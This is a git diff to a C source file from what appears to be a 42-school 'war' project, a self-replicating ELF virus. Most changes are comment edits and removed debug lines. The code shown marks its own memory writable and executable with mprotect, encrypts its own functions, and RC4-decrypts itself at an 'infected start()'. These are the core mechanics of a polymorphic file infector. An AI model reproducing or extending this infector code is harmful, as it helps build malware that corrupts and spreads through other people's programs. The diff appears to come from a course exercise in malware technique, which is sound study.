@@ -6,14 +6,14 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 20:43:40 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/17 11:03:03 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
 /*
-   main() transform our master (number 0 infection) into an *almost* infected binary
+   main() transform our main host (number 0 infection) into an *almost* infected binary
    to match our flip-flop infection routine.
 */
 int		main(void)
@@ -47,19 +47,12 @@ int		main(void)
 	void	*sstart = main;
 	size_t	align = (unsigned long)sstart % 0x1000;
 
-	// set write permission -> ugly way
+	// set write permission
 	if (mprotect(sstart - align, ((void*)end_of_data - (void*)main) + 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
 	{
 		perror("mprotect");
 		return (-1);
 	}
-
-	/* end -> can't encrypt this one. it's create a black magic segfault from nowhere in infected start().
-	   Still unsure about the reason. */
-
-	/* update_two(&data.key, (char*)release, (size_t)end - (size_t)release); */
-	/* revert_two(&data.key, (char*)end, (size_t)update_one - (size_t)end); */
-	/* printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "end", end, (size_t)update_one - (size_t)end, data.key.two); */
 
 	// erase
 	update_two(&data.key, (char*)release, (size_t)erase - (size_t)release);
@@ -141,6 +134,7 @@ void	start(void)
 		: "=r"(data.rsp)
 		);
 
+	// rc4 decryption
 	uint8_t *r4 = (uint8_t*)_rc4;
    	for (register int i = 0  ; i < KEY_SIZE ; i++)
 		data.cpr_key[i] = r4[i];
